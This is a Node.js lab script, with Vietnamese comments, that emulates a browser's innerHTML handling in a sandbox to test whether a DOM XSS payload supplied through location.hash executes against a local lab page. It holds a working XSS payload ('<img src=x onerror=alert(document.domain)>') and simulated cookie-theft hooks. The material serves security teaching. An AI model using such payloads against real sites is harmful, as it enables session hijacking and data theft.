// dom-emulate.js - "trinh duyet mini" cho lab 3.3 (DOM XSS), chay bang Node.
//
// Vi khong co GUI, ta mo phong DUNG hanh vi quan trong cua trinh duyet khi gan
// innerHTML: parser dung len the HTML, va voi <img onerror=...> (hoac <svg onload=...>)
// thi event handler duoc THUC THI. (Luu y that: trinh duyet KHONG chay the <script>
// chen qua innerHTML, nhung CHAY event handler - vi vay payload DOM XSS kinh dien
// dung <img src=x onerror=...>. Emulator nay mo phong dung diem do.)
//
// Emulator se:
//   1. Tai trang THAT tu server (de chay dung doan JS client ma server ship).
//   2. Dat location.hash = payload (argv).
//   3. Chay doan <script> inline cua trang trong mot sandbox.
//   4. Bao cao event handler cua ke tan cong co thuc thi hay khong.
//
// Dung: node dom-emulate.js "<payload-hash-khong-co-#>"

const http = require("http");
const vm = require("vm");

const BASE = "http://127.0.0.1:8034/";
const payloadHash = process.argv[2] || "<img src=x onerror=alert(document.domain)>";

function fetchPage(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve(data));
    }).on("error", reject);
  });
}

function extractInlineScript(html) {
  const m = html.match(/<script>([\s\S]*?)<\/script>/i);
  return m ? m[1] : null;
}

(async () => {
  const html = await fetchPage(BASE);
  const clientJs = extractInlineScript(html);
  if (!clientJs) {
    console.log("Khong tim thay script client trong trang.");
    process.exit(2);
  }

  console.log("=".repeat(70));
  console.log("[1] Trang server tra ve (bat bien, KHONG chua payload):");
  console.log("    payload nam o location.hash, server khong he nhin thay no.");
  console.log("    URL nan nhan bi lua mo: " + BASE + "#" + payloadHash);
  console.log("=".repeat(70));
  console.log("[2] Doan JS client (source -> sink) ma server ship:");
  clientJs.split("\n").forEach((l) => {
    if (l.trim()) console.log("    " + l.trim());
  });

  // Ghi nhan khi code ke tan cong chay.
  const executed = [];

  // Sandbox: cac global ma doan script client can.
  const sandbox = {
    decodeURIComponent,
    encodeURIComponent,
    String,
    console,
    // source:
    location: { hash: "#" + payloadHash },
    // "danh tinh" nan nhan de payload co cai ma trom:
    __domain: "127.0.0.1",
    __cookie: "session=dom-victim-9b1c",
    // ham bi payload goi:
    alert: (x) => {
      executed.push("alert(" + x + ")");
      console.log("    >>> alert() CHAY voi gia tri: " + x);
    },
    exfil: (x) => {
      executed.push("exfil(" + x + ")");
      console.log("    >>> exfil() CHAY, gui di: " + x);
    },
  };
  // document.domain / document.cookie gia lap:
  sandbox.document = {
    get domain() { return sandbox.__domain; },
    get cookie() { return sandbox.__cookie; },
    getElementById() {
      const el = {};
      Object.defineProperty(el, "innerHTML", {
        set(htmlValue) {
          el._html = htmlValue;
          // Mo phong parser: tim event handler trong HTML duoc gan va chay no.
          const re = /on(?:error|load)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/gi;
          let m;
          while ((m = re.exec(htmlValue)) !== null) {
            const code = m[1] || m[2] || m[3];
            // Chay code handler trong CHINH sandbox nay.
            vm.runInContext(code, ctx, { filename: "on*-handler" });
          }
        },
        get() { return el._html; },
      });
      return el;
    },
  };

  const ctx = vm.createContext(sandbox);

  console.log("=".repeat(70));
  console.log("[3] Chay doan script client voi location.hash = payload:");
  vm.runInContext(clientJs, ctx, { filename: "client-inline" });

  console.log("=".repeat(70));
  if (executed.length > 0) {
    console.log("[4] KET QUA: DOM XSS THANH CONG. Code ke tan cong da chay:");
    executed.forEach((e) => console.log("      - " + e));
    process.exit(0);
  } else {
    console.log("[4] KET QUA: khong co code ke tan cong chay (payload khong vao duoc sink).");
    process.exit(1);
  }
})();
